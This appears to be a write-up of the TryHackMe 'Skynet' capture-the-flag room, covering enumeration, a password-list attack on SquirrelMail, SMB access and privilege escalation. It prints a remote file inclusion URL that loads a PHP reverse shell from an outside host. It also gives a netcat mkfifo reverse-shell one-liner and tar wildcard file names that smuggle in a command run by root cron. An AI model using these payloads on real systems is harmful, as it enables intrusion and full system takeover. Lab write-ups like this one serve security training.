# Skynet - Writeup

**Date**: 03/04/2022

**Difficulty**: Easy

**CTF**: [https://tryhackme.com/room/skynet](https://tryhackme.com/room/skynet)

---

A vulnerable Terminator themed Linux machine.

# What is Miles password for his emails?

First things first, let’s to a quick scan:

![Untitled](images/Untitled.png)

Ping received by the machine. as the ttl=63 we can guess it is a Linux machine (as the description says).

![Untitled](images/Untitled%201.png)

nmap discovered several ports open. Let’s get more info of them:

![Untitled](images/Untitled%202.png)

Let’s see what the webserver has:

![Untitled](images/Untitled%203.png)

The landing page is something like a browser (a copy of Google to be more exact). 

![Untitled](images/Untitled%204.png)

Source code of the page doesn’t reveal nothing like a credential.

I have checked if robots.txt file exists but it doesn’t. I also tried to search some words, with no success. The site didn’t create any cookie or load any script.

Let’s proceed with the directory & files enumeration.

![Untitled](images/Untitled%205.png)

gobuster found some directories we have not access to. All of the discovered ones except one send us a forbidden status (403). 

Let’s see what’s inside /squirrelmail

![Untitled](images/Untitled%206.png)

There is nothing in the source code we can use. I’m pretty sure that we’ll be using this login form in the future.

I’m going to check if the webpage is vulnerable to XSS:

![Untitled](images/Untitled%207.png)

Nope, nothing happens.

Let’s capture the request with burpsuite and see if there is something interesting there:

![Untitled](images/Untitled%208.png)

Apparently it doesn’t matter what you try to seach, it always send the submit parameter with “Skynet+Search” value.

Let’s try to change it and send “Admin” value... Just to try something:

Same results as before. This seems to be a non-exit path.

Let’s take a look at the nmap results again...

![Untitled](images/Untitled%209.png)

Dovecot imapd seems to be an IMAP server (used for emails). And it looks like it has activated some capabilities like LoginDisable and Pre-login... it sounds strange.

 According to HackTricks:

![Untitled](images/Untitled%2010.png)

![Untitled](images/Untitled%2011.png)

We have connected to the Dovecot service, but I have no idea what can I do here... Aparently I can do nothing if I cannot login, so move to the next thing.

![Untitled](images/Untitled%2012.png)

There is an SMB server exposed in the port 445, let’s see what can we see without credentials:

`xdg-open smb://10.10.208.14`

![Untitled](images/Untitled%2013.png)

![Untitled](images/Untitled%2014.png)

As anonymous, the only folder we have access to is “anonymous”:

![Untitled](images/Untitled%2015.png)

![Untitled](images/Untitled%2016.png)

We found a text file with a message from Miles Dyson and a folder with 3 files:

![Untitled](images/Untitled%2017.png)

![Untitled](images/Untitled%2018.png)

Only one of them have information, and it looks like a password list. I’m going to save it.

It would be funny if the password of Miles Dyson is part of this list, as he sent a message asking all users to change their passwords... I have to check it.

To do it I’ll use hydra, with `milesdyson` as username and the `log1.txt` as wordlist for passwords:

![Untitled](images/Untitled%2019.png)

Nope. I also tried with ssh and imap with same results.

Oh, the squirrel mail login page... maybe it will work? As the wordlist is not so large, I’ll try to do a dictionary attack using BurpSuite:

First off all, let’s intercept a login request:

![Untitled](images/Untitled%2020.png)

Send the request to intruder, configure it...

![Untitled](images/Untitled%2021.png)

![Untitled](images/Untitled%2022.png)

And Start the attack!

![Untitled](images/Untitled%2023.png)

After a few minutes, the attack finishes and attending to the length of the responses, every request except one have a lenght of 3240 which probably indicates that the login has failed, let’s try to login using the credentials that generated a request with the different length as password:

![Untitled](images/Untitled%2024.png)

Yeah! We’re in!

# What is the hidden directory?

Before anything, let’s take a look to the emails:

![Untitled](images/Untitled%2025.png)

strange email from serenakkogan, anyway I’ll take note of the test just in case:

```
i can i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i i can i i i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i . . . . . . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i i i i i everything else . . . . . . . . . . . . . .
balls have 0 to me to me to me to me to me to me to me to me to
you i i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to

```

![Untitled](images/Untitled%2026.png)

```
01100010 01100001 01101100 01101100 01110011 00100000 01101000 01100001 01110110
01100101 00100000 01111010 01100101 01110010 01101111 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111
```

Same as before it’s pretty strange, but this time it’s clearly recognizable that it is written in binary, so let’s try to convert it to something readable:

`balls have zero to me to me to me to me to me to me to me to me to` 

Ok... Let’s move on

![Untitled](images/Untitled%2027.png)

This one is interesting, it includes the new password for the samba service of this user.

I checked the Drafts, Sent and Trash folders but there was nothing there.

With the credentials, let’s try to log in samba share using these credentials:

![Untitled](images/Untitled%2028.png)

![Untitled](images/Untitled%2029.png)

Logged in! The password is correct.

![Untitled](images/Untitled%2030.png)

The file important.txt looks... important:

![Untitled](images/Untitled%2031.png)

I think we have found the hidden folder!

![Untitled](images/Untitled%2032.png)

Yep we did!

# What is the vulnerability called when you can include a remote file for malicious purposes?

Remote file inclusion

# What is the user flag?

Let’s do a directory scan in the new folder found:

![Untitled](images/Untitled%2033.png)

Gobuster quickly discovers the directory /administrator, let’s look whats inside:

![Untitled](images/Untitled%2034.png)

The CMS used is something called Cuppa... Let’s look if there is any exploitable vunerability

![Untitled](images/Untitled%2035.png)

Yeah, apparently it’s one that will allow us to do remote file inclusion, nice:

![Untitled](images/Untitled%2036.png)

Apparently we can create a http server in our machine, hosting a php reverse shell that will be executed by the target... Let’s try:

After the http server is set up, he have to navigate to:

[`http://10.10.25.208/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.10.10:8000/php-reverse-shell.php`](http://10.10.25.208/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.10.10:8000/php-reverse-shell.php)

![Untitled](images/Untitled%2037.png)

And we get a reverse shell, awesome!

![Untitled](images/Untitled%2038.png)

# What is the root flag?

First try is to try to see if we can cd /root

![Untitled](images/Untitled%2039.png)

Nope.

Well, as we will be interacting with this console, let’s see if we see some ssh credentials, if not, we’ll have to stabilize the console:

![Untitled](images/Untitled%2040.png)

No ssh credentials, time to stabilize it:

![Untitled](images/Untitled%2041.png)

done, now let’s look for something we can use to escalate privileges.

![Untitled](images/Untitled%2042.png)

passwd is readable, but shadow no.

![Untitled](images/Untitled%2043.png)

As we don’t know the password of the user www-data we cannot list if there is any command that we can run with sudo.

![Untitled](images/Untitled%2044.png)

There is a script being executed every minute as root, and it is in the /home/milesdyson/backups folder.

Let’s see if we have write permissions there:

![Untitled](images/Untitled%2045.png)

Nope, we don’t.

Let’s try to log in as milesdyson using the password found previously with BurpSuite:

![Untitled](images/Untitled%2046.png)

Yeah, it worked.

![Untitled](images/Untitled%2047.png)

This user cannot enter in /root neither.

![Untitled](images/Untitled%2048.png)

And cannot change the script... let’s see if can execute something using sudo:

![Untitled](images/Untitled%2049.png)

Nothing. Meh... let’s use linPEAS, I’m out of ideas.

linPEAS didn’t help me this time and I had to read another write up... Apparently we can use the [backup.sh](http://backup.sh) script, as it creates a backup of a directory using tar, and there is a vulnerability of tar we can take advantage of ([https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/))

So, we had to execute this code (with www-data user):

```jsx
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f" > shell.sh 
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh" 
touch "/var/www/html/--checkpoint=1"
```

![Untitled](images/Untitled%2050.png)

Open a netcat listener and wait for the root console:

![Untitled](images/Untitled%2051.png)

Aaaand done.